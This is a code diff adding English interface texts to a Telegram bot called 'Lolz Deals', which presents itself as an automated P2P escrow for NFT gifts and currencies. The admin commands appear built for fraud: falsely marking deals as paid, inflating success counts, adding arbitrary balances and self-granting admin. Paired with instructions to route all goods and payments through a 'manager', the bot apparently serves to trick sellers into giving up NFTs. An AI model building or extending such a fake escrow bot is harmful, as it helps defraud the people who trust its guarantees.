@@ -374,7 +374,239 @@ TEXTS = {
             f"{EMOJI_SHIELD} Вы успешно стали администратором на 6 месяцев!"
         ),
     },
-    'en': {}
+    'en': {
+        'welcome': (
+            f"<b>{EMOJI_TROPHY} Welcome to Lolz Deals</b>\n\n"
+            f"<blockquote><b>{EMOJI_ROBOT} Your trusted P2P guarantor:</b>\n"
+            f"— <b>Automated deals</b> with NFTs and currencies\n"
+            f"— {EMOJI_SHIELD} <b>Full protection</b> for both parties\n"
+            f"— {EMOJI_MONEY} <b>Referral program</b> — <i>50% of fee</i>\n"
+            f"— {EMOJI_PACKAGE} <b>Goods transfer</b> via manager: @LZSupp</blockquote>\n\n"
+            f"{EMOJI_MEGAPHONE} <b>Channel:</b> @LiveLolz"
+        ),
+        'lang_prompt': f"<b>{EMOJI_GLOSSARY} Select language:</b>",
+        'lang_ru': "Russian",
+        'lang_en': "English",
+        'referral': (
+            f"<b>{EMOJI_MONEY} Referral program</b>\n\n"
+            f"<blockquote><b>Your referral link:</b>\n"
+            f"<code>{REF_LINK_USER}</code>\n"
+            f"<b>Referrals:</b> 0\n"
+            f"<b>Earned:</b> 0.0 TON</blockquote>\n\n"
+            f"<b>Bonus:</b> 50% of commission from each referral deal!"
+        ),
+        'copy_btn': "Copy referral link",
+        'back_btn': "Back to menu",
+        'balance': "Balance",
+        'deals': "My deals",
+        'referrals_btn': "Referrals",
+        'lang_btn': "Language / Lang",
+        'requisites': "My requisites",
+        'create': "Create deal",
+        'support': "Support",
+        'deals_title': "My deals",
+        'deals_stats': f"Total: {{total}} {EMOJI_TROPHY} Completed: {{completed}} {EMOJI_PACKAGE}",
+        'deals_list_empty': "You have no deals yet.",
+        'search_btn': "Search by code",
+        'search_prompt': "Enter deal code (e.g., Yi4qbQ98):",
+        'deal_not_found': "Deal with code {code} not found.",
+        'deal_details': (
+            "<b>Deal details #{code}</b>\n\n"
+            "Buyer: @{buyer}\n"
+            "Seller: @{seller}\n"
+            "Amount: {amount} {currency}\n"
+            "Time: {time}\n"
+            "Date: {date}"
+        ),
+        'balance_title': f"{EMOJI_MONEY} <b>Your balance:</b>",
+        'balance_empty': "Your balance is empty",
+        'balance_amount': "Your balance: {{amount}} TON",
+        'frozen_amount': "Frozen: {{amount}} TON",
+        'completed_deals': "Completed deals: {{completed}}",
+        'withdraw_need': "You need at least 2 completed deals to withdraw",
+        'withdraw_btn': "Withdraw",
+        'transactions_btn': "Transactions",
+        'transactions_empty': "Transaction history is empty.",
+        'withdraw_form_requisites': "Enter your withdrawal requisites (wallet, card, etc.):",
+        'withdraw_form_amount': "Enter amount to withdraw (available {{amount}} TON):",
+        'withdraw_too_much': "Amount exceeds available balance.",
+        'withdraw_success': f"{EMOJI_MONEY} Withdrawal request for {{amount}} TON sent! Wait for admin confirmation.",
+        'withdraw_fail': "Error creating request. Try again later.",
+        'admin_panel': (
+            f"{EMOJI_SHIELD} <b>Admin panel</b>\n\n"
+            f"{EMOJI_ROBOT} <b>Available commands:</b>\n"
+            f"/hyteam — show this panel\n"
+            f"/vvteam — withdrawal requests\n"
+            f"/chat [@user or id] [text] — reply to user\n"
+            f"/hostlebuy [code] — mark deal as paid\n"
+            f"/ref [code] — notify about gift issue\n"
+            f"/boost_success [number] — increase successful deals count\n"
+            f"/giveadmin [@user or id] [time] — grant admin (1m,1h,1d,1w,1M,1y)\n"
+            f"/addbalance [id] [amount] — add balance\n"
+            f"/logs — view logs\n"
+            f"/rzzteam — become admin for 6 months\n"
+            f"/complete_deal [code] — complete deal manually"
+        ),
+        'admin_no_access': f"{EMOJI_SHIELD} You don't have access to this command.",
+        'admin_withdraw_list': "Withdrawal requests:\n{list}",
+        'admin_withdraw_empty': "No active withdrawal requests.",
+        'admin_withdraw_confirm': f"{EMOJI_MONEY} Withdrawal request for {{amount}} TON from user {{user}} confirmed!",
+        'admin_withdraw_error': "Error confirming.",
+        'chat_success': "Message sent to user.",
+        'chat_fail': "Failed to send message.",
+        'chat_no_deal': "You have no deals with this user.",
+        'chat_not_first': "User hasn't contacted support first.",
+        'chat_limit': "Message limit exceeded for this deal (max 10).",
+        'hostlebuy_success': f"{EMOJI_MONEY} Deal {{code}} marked as paid, notifications sent.",
+        'hostlebuy_fail': "Deal not found or already paid.",
+        'ref_success': f"{EMOJI_MEGAPHONE} Gift issue notification sent to participants of deal {{code}}.",
+        'ref_fail': "Deal not found or inactive.",
+        'boost_success': f"{EMOJI_TROPHY} Successful deals count increased by {{num}}.",
+        'boost_fail': "Enter a number.",
+        'giveadmin_success': f"{EMOJI_SHIELD} User {{user}} granted admin rights for {{time_str}}.",
+        'giveadmin_fail': "Invalid time format. Use: 1m, 1h, 1d, 1w, 1M, 1y",
+        'addbalance_success': f"{EMOJI_MONEY} User {{user}} got {{amount}} TON. New balance: {{new_balance}} TON.",
+        'addbalance_fail': "Invalid format. Use: /addbalance [id] [amount]",
+        'addbalance_user_not_found': "User with ID {user} not found.",
+        'logs_header': f"{EMOJI_GLOSSARY} Action logs:\n\n",
+        'logs_empty': "No logs yet.",
+        'logs_entry': "{{time}} | {{user}} | {{action}} | {{data}}",
+        'support_contact': f"{EMOJI_SHIELD} Support\n\nContact our manager:\n@boyfrer",
+        'requisites_title': f"{EMOJI_PIN} <b>My requisites</b>",
+        'requisites_body': (
+            f"<blockquote>{EMOJI_DIAMOND} <b>TON wallet:</b>\n"
+            f"<code>{{ton}}</code>\n\n"
+            f"{EMOJI_CARD} <b>Card:</b>\n"
+            f"<code>{{card}}</code>\n\n"
+            f"{EMOJI_STAR} <b>Stars:</b>\n"
+            f"<code>{{stars}}</code>\n\n"
+            f"{EMOJI_MONEY} <b>USDT (TRC20):</b>\n"
+            f"<code>{{usdt}}</code>\n\n"
+            f"{EMOJI_COIN} <b>BTC:</b>\n"
+            f"<code>{{btc}}</code></blockquote>"
+        ),
+        'requisites_buttons': {
+            'ton': "TON wallet",
+            'card': "Card",
+            'stars': "Stars",
+            'usdt': "USDT wallet",
+            'btc': "BTC wallet"
+        },
+        'requisites_edit_prompt': "Enter new {field}:",
+        'requisites_edit_invalid': "Invalid format. Try again.",
+        'requisites_edit_success': "✅ Data updated!",
+        'create_role': (
+            f"<b>{EMOJI_TROPHY} New deal</b>\n\n"
+            f"Who are you in this deal?\n\n"
+            f"<b>{EMOJI_ROBOT} Seller</b> — you sell goods/service and receive payment.\n"
+            f"<b>{EMOJI_MONEY} Buyer</b> — you pay and receive goods/service."
+        ),
+        'create_payment': (
+            f"<b>{EMOJI_TROPHY} Payment method:</b>\n\n"
+            f"How would you like to pay?"
+        ),
+        'create_currency': (
+            f"<b>{EMOJI_TROPHY} Select card currency:</b>"
+        ),
+        'create_amount': f"<b>{EMOJI_MONEY} Enter amount in {{currency}}:</b>",
+        'create_description': (
+            f"<b>{EMOJI_PIN} Describe the deal item:</b>\n\n"
+            f"<blockquote>\n"
+            f"Add the deal value or a direct link to the NFT/gift.\n"
+            f"Example: <code>https://t.me/nft/PlushPepe-111</code>\n"
+            f"or just a text description of the product.\n"
+            f"</blockquote>\n\n"
+            f"<b>Telegram</b>\n"
+            f"<b>Plush Pepe #111</b>\n\n"
+        ),
+        'create_confirm_buyer': (
+            f"<b>{EMOJI_TROPHY} Deal details (buyer)</b>\n\n"
+            f"<blockquote>\n"
+            f"<b>{EMOJI_MONEY} Currency:</b> {{currency}}\n"
+            f"<b>{EMOJI_PACKAGE} Amount:</b> {{amount}} {{currency_symbol}}\n"
+            f"<b>{EMOJI_PIN} Description:</b> {{description}}\n"
+            f"</blockquote>\n\n"
+            f"{EMOJI_LIGHTNING} <b>Link for seller:</b>\n"
+            f"<code>{{link}}</code>\n\n"
+            f"Or invite via inline: enter @[email protected] any chat\n\n"
+            f"<b>Telegram</b>\n"
+            f"<b>{{description}}</b>\n\n"
+            f"{EMOJI_ROCKET} Waiting for seller to join."
+        ),
+        'create_confirm_seller': (
+            f"<b>{EMOJI_TROPHY} Deal details (seller)</b>\n\n"
+            f"<blockquote>\n"
+            f"<b>{EMOJI_MONEY} Currency:</b> {{currency}}\n"
+            f"<b>{EMOJI_PACKAGE} Amount:</b> {{amount}} {{currency_symbol}}\n"
+            f"<b>{EMOJI_PIN} Description:</b> {{description}}\n"
+            f"</blockquote>\n\n"
+            f"{EMOJI_LIGHTNING} <b>Link for buyer:</b>\n"
+            f"<code>{{link}}</code>\n\n"
+            f"Or invite via inline: enter @[email protected] any chat\n\n"
+            f"<b>Telegram</b>\n"
+            f"<b>{{description}}</b>\n\n"
+            f"{EMOJI_ROCKET} Waiting for buyer to join."
+        ),
+        'deal_created_buyer': (
+            f"<b>{EMOJI_TROPHY} You joined deal {{code}} as buyer.</b>\n\n"
+            f"<blockquote>\n"
+            f"• <b>Buyer:</b> ID {{buyer_id}}, deals: {{buyer_deals}}\n"
+            f"• <b>Description:</b> {{description}}\n"
+            f"• <b>Currency:</b> {{currency}}\n"
+            f"• <b>Amount:</b> {{amount}}\n"
+            f"• <b>Manager requisites:</b> {{manager_requisites}}\n"
+            f"</blockquote>\n\n"
+            f"{EMOJI_SHIELD} All payments and goods transfer go ONLY through the manager\n\n"
+            f"After buyer confirms payment — transfer the goods to the manager.\n\n"
+            f"<b>Telegram</b>\n"
+            f"{{description}}"
+        ),
+        'deal_created_seller': (
+            f"<b>{EMOJI_TROPHY} You joined deal #{{code}} as seller.</b>\n\n"
+            f"<blockquote>\n"
+            f"Manager requisites for payment: {{manager_requisites}}\n"
+            f"Seller completed deals: {{seller_deals}}\n"
+            f"</blockquote>\n\n"
+            f"{EMOJI_SHIELD} All payments go ONLY through the manager @Iank. Do not transfer funds directly to the seller!\n"
+            f"Check the requisites before payment!\n\n"
+            f"Wait for payment from the buyer. After receiving payment, click «I sent the gift»."
+        ),
+        'deal_completed': (
+            f"<b>{EMOJI_TROPHY} Deal #{{code}} completed!</b>\n\n"
+            f"{EMOJI_MEGAPHONE} Thank you for conducting the deal in our bot. We greatly value the safety of our buyers and sellers."
+        ),
+        'deal_cancelled': "Deal cancelled.",
+        'gift_sent_seller': (
+            f"{EMOJI_PACKAGE} You sent the gift for deal #{{code}}. Waiting for admin confirmation."
+        ),
+        'gift_sent_admin': (
+            f"{EMOJI_MEGAPHONE} <b>Seller reported gift transfer for deal #{{code}}</b>\n\n"
+            f"<blockquote>\n"
+            f"Buyer: @{{buyer}}\n"
+            f"Seller: @{{seller}}\n"
+            f"Amount: {{amount}} {{currency}}\n"
+            f"Description: {{description}}\n"
+            f"</blockquote>\n\n"
+            f"Check that the gift has indeed been transferred, contact the buyer."
+        ),
+        'gift_confirm_admin': (
+            f"{EMOJI_SHIELD} <b>Gift transfer confirmed for deal #{{code}}</b>\n\n"
+            f"You confirmed that the gift was transferred. Buyer and seller will be notified."
+        ),
+        'gift_reject_admin': (
+            f"{EMOJI_SHIELD} <b>Gift transfer rejected for deal #{{code}}</b>\n\n"
+            f"You sent a message to the seller: «{{message}}»"
+        ),
+        'gift_confirm_buyer': (
+            f"{EMOJI_TROPHY} Gift for deal #{{code}} confirmed by admin. Deal completed."
+        ),
+        'gift_reject_seller': (
+            f"{EMOJI_SHIELD} Admin said: «{{message}}». Please contact support."
+        ),
+        'rzzteam_success': (
+            f"{EMOJI_SHIELD} You have successfully become an administrator for 6 months!"
+        ),
+    }
 }
 
 # ---------- Вспомогательные функции ----------
@@ -904,7 +1136,11 @@ async def change_currency(callback: types.CallbackQuery, state: FSMContext):
         [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
         [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    try:
+        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в change_currency: {e}")
+        await callback.message.answer("Произошла ошибка. Попробуйте позже.")
 
 @dp.message(CreateDealStates.amount)
 async def process_amount(message: Message, state: FSMContext):
